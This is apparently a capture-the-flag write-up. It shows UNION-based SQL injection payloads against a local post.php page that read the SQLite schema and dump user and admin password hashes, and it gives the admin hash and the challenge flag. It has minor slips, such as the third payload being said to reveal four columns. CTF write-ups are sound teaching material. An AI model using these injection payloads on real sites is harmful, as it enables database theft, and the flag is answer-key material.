The /post.php page is vulnerable to SQL injection.

Step-by-Step Exploitation

1. Identifying the Vulnerability:
- The vulnerability allows us to inject SQL commands through the `id` parameter of the `post.php` page.


Whenever the vulnerability is identified, we can try a few SQLi payloads to identify the number of columns of the initial SQL request we are injecting into : 
http://localhost/post.php?id=-1 UNION ALL SELECT NULL
http://localhost/post.php?id=-1 UNION ALL SELECT NULL,NULL
http://localhost/post.php?id=-1 UNION ALL SELECT NULL,NULL,NULL
http://localhost/post.php?id=-1 UNION ALL SELECT NULL,NULL,NULL,NULL

When injecting the 3rd payload, there are no errors anymore. This lets us know that there are 4 columns in the first request. (id, created_at, title, content)

2. Retrieving the Table Structure:
- To understand the database schema, we can exploit the vulnerability to retrieve the structure of the `user` table.
- The following URL is used:

http://localhost/post.php?id=-1 UNION ALL SELECT NULL,NULL,sql,NULL FROM sqlite_master

- Here, we use the `UNION ALL` statement to combine the results of two queries: the original one and our injected one. The injected query selects columns from `sqlite_master`, which holds the schema information of the database.

3. Retrieving the Admin Hash:
- To retrieve the hash of the admin user, we inject another SQL query:

http://localhost/post.php?id=-1 UNION ALL SELECT NULL,NULL,username,password FROM users

This returns the user called `user` and his hash. We are not interested by this hash, we want the admin's hash.

http://localhost/post.php?id=-1 UNION ALL SELECT NULL,NULL,username,password FROM users LIMIT 1 OFFSET 1

- This query targets the `users` table and selects the `username` and `password` columns. The `LIMIT 1 OFFSET 1` clause is used to skip the first row and fetch the second row (because the first row corresponds to the user `user`).

4. Extracting the Hash:
- The result of the above query reveals the hash of the admin user:

bf4776ba55b41ae54b00fc2fee111562

- Consequently, the flag for the CTF challenge is:

FSIIECTF{bf4776ba55b41ae54b00fc2fee111562}
